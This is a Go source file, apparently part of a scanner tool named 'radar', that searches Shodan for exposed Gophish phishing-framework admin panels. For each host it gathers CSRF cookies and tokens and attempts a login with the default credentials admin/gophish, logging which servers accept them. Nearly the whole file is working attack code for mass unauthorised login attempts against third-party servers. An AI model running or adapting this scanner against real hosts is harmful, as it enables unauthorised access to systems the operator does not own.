package scanner

import (
	"sync"

	"fmt"
	"flag"

	"net"
	"net/url"
	"net/http"

	"html"
	"strings"

	"radar/core"
	"radar/model"
)

var (
	GOPHISH_LOGIN_PATH = "/login?next=%2F"
	GOPHISH_DEFAULT_USER = "admin"
	GOPHISH_DEFAULT_PASSWORD = "gophish"
)

type GophishScanner struct {
	Menu *flag.FlagSet
}

func NewGophishScanner() (*GophishScanner){
	menu := flag.NewFlagSet("gophish", flag.ExitOnError)
	menu.StringVar(&core.SHODAN_API_KEY, "apiKey", "", "shodan api key (*)")

	gophishScanner := &GophishScanner {
		Menu: menu,
	}
	
	return gophishScanner
}

func (gophish GophishScanner) Scan() {
	var wg sync.WaitGroup

	if core.SHODAN_API_KEY == "" {
		core.WarningLog("Please fill all required parameter!")
		return
	}

	results := core.ShodanSearch("gophish")

	if (len(results.Matches) < 1) {
		core.WarningLog("Shodan can not found any record!")
		return
	} else {
		core.WarningLog(fmt.Sprintf("%d Record Detected", len(results.Matches)))
	}

	for _, result := range results.Matches {
		status, conn := core.HostControl(result.Port, result.Ip_str)

		if (status) {
			go func(r model.SearchResult, c net.Conn) {
				defer c.Close()
				wg.Add(1)
				checkGophishkDefaultCredential(r, &wg)
			}(result, conn)
		}
	}

	wg.Wait()
}

func checkGophishkDefaultCredential(searchResult model.SearchResult, wg *sync.WaitGroup) {
	defer wg.Done()

	protocol := "http://"

	if (searchResult.Ssl.Jarm != "") {
		protocol = "https://"
	}

	gorillaCsrfCookie, gophishCsrfCookie, csrfToken := getGophishCsrfToken(searchResult, protocol)

	req, err := core.PrepareRequest("POST", fmt.Sprintf("%s%s:%d%s", protocol, searchResult.Ip_str, searchResult.Port, GOPHISH_LOGIN_PATH) , fmt.Sprintf("username=%s&password=%s&csrf_token=%s", GOPHISH_DEFAULT_USER, GOPHISH_DEFAULT_PASSWORD, csrfToken))
	if (err != nil) {
		return
	}

	req.AddCookie(&http.Cookie{Name: "_gorilla_csrf", Value: gorillaCsrfCookie})
	req.AddCookie(&http.Cookie{Name: "gophish", Value: gophishCsrfCookie})
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0")

	_, statusCode, _, err := core.SendRequest(req)
	if (err != nil) {
		return
	}

	if (statusCode == 302) {
		core.SuccessLog(fmt.Sprintf("Default Credential Work - %s:%d", searchResult.Ip_str, searchResult.Port))
	} else {
		core.FailLog(fmt.Sprintf("Default Credential Not Work - %s:%d", searchResult.Ip_str, searchResult.Port))
	}
}

func getGophishCsrfToken(searchResult model.SearchResult, protocol string) (string, string, string){
	req, err := core.PrepareRequest("GET", fmt.Sprintf("%s%s:%d/", protocol, searchResult.Ip_str, searchResult.Port) , "")
	if (err != nil) {
		return "", "", ""
	}

	_, _, headers, err := core.SendRequest(req)
	if (err != nil) {
		return "", "", ""
	}

	gorillaCsrfCookie := url.QueryEscape(strings.TrimPrefix(strings.Split(headers.Get("Set-Cookie"), ";")[0], "_gorilla_csrf="))

	req, err = core.PrepareRequest("GET", fmt.Sprintf("%s%s:%d%s", protocol, searchResult.Ip_str, searchResult.Port, GOPHISH_LOGIN_PATH) , "")
	if (err != nil) {
		return "", "", ""
	}
	
	req.AddCookie(&http.Cookie{Name: "_gorilla_csrf", Value: gorillaCsrfCookie})
	
	body, _, headers, err := core.SendRequest(req)
	if (err != nil) {
		return "", "", ""
	}

	gophishCsrfCookie := strings.TrimPrefix(strings.Split(headers.Get("Set-Cookie"), ";")[0], "gophish=")
	csrfTokenIndex := strings.Index(string(body), "name=\"csrf_token\"")
	
	//CSRF Token include some HTML entities like &#43;
	csrfToken := url.QueryEscape(html.UnescapeString(strings.Split(string(body)[csrfTokenIndex + 25:], "\" />")[0]))

	return gorillaCsrfCookie, gophishCsrfCookie, csrfToken
}